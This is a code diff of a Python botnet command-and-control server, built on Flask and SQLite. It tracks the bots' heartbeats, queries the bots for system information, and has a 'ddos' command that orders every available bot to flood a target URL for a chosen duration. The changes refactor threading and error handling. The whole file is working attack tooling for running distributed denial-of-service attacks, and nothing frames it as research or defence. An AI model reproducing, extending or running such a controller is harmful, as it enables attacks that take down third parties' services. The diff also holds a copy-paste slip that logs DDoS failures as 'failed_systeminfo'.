@@ -1,10 +1,10 @@
 from flask import Flask, request
 from werkzeug.serving import make_server
+from enum import Enum
 import threading
 import sqlite3
 import logging
 import requests
-from enum import Enum
 import cmd
 import re
 import time
@@ -14,16 +14,14 @@ db = None
 
 def main():
     global server, db
-    flaskServer = FlaskServer(5000)
     db = DB()
     db.execute("UPDATE bots SET status = 'offline'")
+    flaskServer = FlaskServer(5000)
     flaskServer.run()
     log = logging.getLogger('werkzeug')
     log.disabled = True
-    threading.Thread(target = lambda: CommandShell().cmdloop()).start()
-    while True:
-        db.setOfflineHeartBeat()
-        time.sleep(60)
+    threading.Thread(target = lambda: checkHeartBeat()).start()
+    CommandShell().cmdloop()
 
 class BotStatus(str, Enum):
     ONLINE = "online",
@@ -42,9 +40,11 @@ class CommandShell(cmd.Cmd):
                 result = requests.get(f"http://{client['ip_address']}:{client['listening_port']}/systeminfo", timeout=5).json()
                 print(f"[{result['mac-address']}]\n\tHostname: {result['hostname']}\n\tListening Address: http://{client['ip_address']}:{client['listening_port']}\n\tPlatform: {result['platform']} {result['platform-release']} {result['platform-version']}\n\tArchitecture: {result['architecture']}\n\tProcessor: {result['processor']}\n\tRAM: {result['ram']}")
                 db.updateLastTask("systeminfo", None, client['mac_address'], BotStatus.ONLINE)
-            except Exception as e:
+            except ConnectionError as e:
                 print(f"{client['mac_address']} is offline.")
                 db.updateLastTask("failed_systeminfo", None, client['mac_address'], BotStatus.OFFLINE)
+            except Exception as e:
+                db.updateLastTask("failed_systeminfo", None, client['mac_address'], BotStatus.ONLINE)
 
         args = split_string(args)
         if args:
@@ -62,8 +62,9 @@ class CommandShell(cmd.Cmd):
     def do_listbots(self, args):
         'List all bots with the relative statuses.'
         def printBots(bots):
-            for bot in bots:
-                print(f"[{bot['mac_address']}]: \n\tStatus: {bot['status']}\n\tListening Address: http://{bot['ip_address']}:{bot['listening_port']}\n\tLast Executed Task: {bot['last_task']}\n\tLast Executed Task Timestamp: {bot['last_task_timestamp']}\n\tTarget: {bot['last_target']}")
+            if (bots):
+                for bot in bots:
+                    print(f"[{bot['mac_address']}]: \n\tStatus: {bot['status']}\n\tListening Address: http://{bot['ip_address']}:{bot['listening_port']}\n\tLast Executed Task: {bot['last_task']}\n\tLast Executed Task Timestamp: {bot['last_task_timestamp']}\n\tTarget: {bot['last_target']}")
         args = split_string(args)
         if args:
             match (args[0]):
@@ -84,20 +85,24 @@ class CommandShell(cmd.Cmd):
         return completitions
     
     def do_ddos(self, args):
+        'DDOSl a target with all available bots (default 10 seconds).'
         def ddos(bot, body):
             try:
                 db.updateLastTask("ddos", body['url'], bot['mac_address'], BotStatus.RUNNING)
                 requests.post(f"http://{bot['ip_address']}:{bot['listening_port']}/ddos", json=body)
                 db.updateLastTask("ddos", body['url'], bot['mac_address'], BotStatus.ONLINE)
+            except ConnectionError as e:
+                print(f"{bot['mac_address']} is offline.")
+                db.updateLastTask("failed_systeminfo", None, bot['mac_address'], BotStatus.OFFLINE)
             except Exception:
-                db.updateLastTask("failed_ddos", body['url'], bot['mac_address'], BotStatus.OFFLINE)
+                db.updateLastTask("failed_ddos", body['url'], bot['mac_address'], BotStatus.ONLINE)
         args = split_string(args)
 
         if args:
             body = {}
             body['url'] = args[0]
             body['timeSeconds'] = 10
-            if args[1] and args[1].isdigit():
+            if len(args) >= 2 and args[1].isdigit():
                 body['timeSeconds'] = int(args[1])
             bots = db.getAllAvailableBots()
             if bots:
@@ -160,6 +165,7 @@ class DB:
     
     def execute(self, query: str, *arg):
         cur = self.con.cursor()
+        cur.execute("PRAGMA foreign_keys = ON;")
         res = cur.execute(query, arg)
         rows = res.fetchall()
         cur.close()
@@ -191,6 +197,11 @@ class DB:
     
     def setOfflineHeartBeat(self):
         self.execute("UPDATE bots SET status = 'offline' WHERE ((julianday(CURRENT_TIMESTAMP) - julianday(last_heartbeat)) * 86400) > 120")
+
+def checkHeartBeat():
+    while True:
+        db.setOfflineHeartBeat()
+        time.sleep(60)
 
 if __name__ == "__main__":
     main()
